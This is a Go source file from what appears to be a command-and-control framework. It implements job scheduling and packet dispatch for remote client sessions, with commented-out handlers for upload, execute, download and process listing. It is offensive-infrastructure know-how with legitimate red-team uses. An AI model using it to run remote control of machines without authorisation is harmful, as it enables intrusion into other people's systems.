package c2

import (
	"context"
	"errors"
	"fmt"
	"time"

	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/util"
)

var (
	// ErrCannotAssign is an error returned by the 'Schedule' function when the random loop cannot find a valid
	// JobID (unused). This may occur in random circumstances when the Scheduler is overused.
	ErrCannotAssign = errors.New("unable to assign a unused JobID (is Scheduler full?)")

	// DefaultClientMux is the default Session Mux instance that handles the default C2 server and client functions.
	// This operates cleanly with the default Server Mux instance.
	DefaultClientMux = MuxFunc(defaultClientMux)
)

// Job is a struct that is used to track and manage
// Tasks given to Session Clients. This struct has function
// callbacks that can be used to watch for completion and also
// offers a Wait function to pause execution until a response is received.
type Job struct {
	ID              uint16
	Done            func(*Job)
	Error           string
	Result          *com.Packet
	Session         *Session
	Start, Complete time.Time

	ctx    context.Context
	cancel context.CancelFunc
}

// Mux is an interface that handles Packets when they arrive for Processing.
type Mux interface {
	Handle(*Session, *com.Packet)
}

// Scheduler is a handler that can manage and schedule Packets as Jobs to be sent to a Session and tracked. The
// resulting output (or errors) can be tracked by the resulting Job structs.
type Scheduler struct {
	s    *Server
	jobs map[uint16]*Job
}

// MuxFunc is the definition of a Mux Handler func. Once wrapped as a 'MuxFunc'.., these function aliases
// can be also used in place of the Mux interface.
type MuxFunc func(*Session, *com.Packet)

// Wait will block until the Job is completed or the parent Server is shutdown.
func (j *Job) Wait() {
	<-j.ctx.Done()
}

// IsDone returns true when the Job has received a response.
func (j *Job) IsDone() bool {
	return j.ctx.Err() != nil
}

// IsError returns true when the Job has received a response, but the response is an error.
func (j *Job) IsError() bool {
	return j.ctx.Err() != nil && len(j.Error) > 0
}

func (x *Scheduler) newJobID() uint16 {
	var (
		ok   bool
		i, c uint16
	)
	for ; c < 256; c++ {
		i = uint16(util.Rand.Uint32())
		if _, ok = x.jobs[i]; !ok {
			return i
		}
	}
	return 0
}
func defaultClientMux(s *Session, p *com.Packet) {
	s.log.Debug("[%s:Mux] Received packet %q.", s.ID, p.String())
	switch p.ID {
	/*case MsgUpload:
		Process(control.Upload, s, p)
	case MsgRefresh:
		Process(control.Refresh, s, p)
	case MsgExecute:
		Process(control.Execute, s, p)
	case MsgDownload:
		Process(control.Download, s, p)
	case MsgProcesses:
		Process(control.ProcessList, s, p)*/
	case MsgHello, MsgPing, MsgSleep, MsgRegistered:
		return
	}
}

// Handle satisfies the Mux interface requirement and will process the received Packet. This function allows
// Wrapped MuxFunc objects to be used directly in place of more complex Mux definitions.
func (m MuxFunc) Handle(s *Session, p *com.Packet) {
	m(s, p)
}

// Handle is the function that inherits the Mux interface. This is used to find and redirect received Jobs. This
// Mux is rarely used in Sessions.
func (x *Scheduler) Handle(s *Session, p *com.Packet) {
	if s == nil || p == nil || x.jobs == nil || p.Job <= 1 {
		return
	}
	j, ok := x.jobs[p.Job]
	if !ok {
		x.s.Log.Warning("[%s:Sched] Received an un-tracked Job ID %d!", s.ID, p.Job)
		return
	}
	s.s.Log.Trace("[%s:Sched] Received response for Job ID %d.", s.ID, p.Device, j.ID)
	j.Result, j.Complete = p, time.Now()
	if p.Flags&com.FlagError != 0 {
		if err := p.ReadString(&j.Error); err != nil {
			j.Error = err.Error()
		}
	}
	delete(x.jobs, j.ID)
	j.cancel()
	if j.Done != nil {
		s.s.events <- event{j: j, jFunc: j.Done}
	}
}

// Schedule will schedule the supplied Packet to the Session and will return a Job struct. This struct will
// indicate when a response from the client has been received.
func (x *Scheduler) Schedule(s *Session, p *com.Packet) (*Job, error) {
	if x.jobs == nil {
		x.jobs = make(map[uint16]*Job, 1)
	}
	if p.Job == 0 {
		p.Job = x.newJobID()
		if p.Job == 0 {
			return nil, ErrCannotAssign
		}
	}
	if _, ok := x.jobs[p.Job]; ok {
		return nil, fmt.Errorf("job ID %d is already being tracked", p.Job)
	}
	if err := s.WritePacket(p); err != nil {
		return nil, err
	}
	j := &Job{ID: p.Job, Start: time.Now(), Session: s}
	j.ctx, j.cancel = context.WithCancel(s.s.ctx)
	x.jobs[p.Job] = j
	return j, nil
}
